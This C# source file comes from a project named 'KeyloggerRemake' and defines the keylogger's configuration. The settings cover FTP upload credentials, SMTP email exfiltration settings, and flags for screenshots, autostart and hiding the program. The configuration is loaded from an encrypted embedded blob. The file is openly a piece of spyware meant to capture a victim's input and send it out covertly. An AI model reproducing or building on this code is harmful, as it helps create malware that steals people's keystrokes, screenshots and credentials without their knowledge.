using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using Newtonsoft.Json;

namespace KeyloggerRemake
{
    class classJsonObj
    {
        static String strEncryptedKey = "";

        public class classJson
        {
            public FTP FTP { get; set; }
            public Email Email { get; set; }
            public Check Check { get; set; }
        }

        public class FTP
        {
            public string Host { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }

        public class Email
        {
            public string Host { get; set; }
            public int Port { get; set; }
            public string Window { get; set; }
            public string FromEmail { get; set; }
            public string Pass { get; set; }
            public string ToEmail { get; set; }
        }

        public class Check
        {
            public bool TakeScreenshot { get; set; }
            public bool SpecificLogging { get; set; }
            public bool SendEmail { get; set; }
            public bool UploadFTP { get; set; }
            public bool Start { get; set; }
            public bool Hide { get; set; }
        }

        public static classJson initializeObj()
        {
            strEncryptedKey = classGetEncryption.getEncryptedKey();

            return classGetEncryption.decryptBson(strEncryptedKey);
        }
    }
}
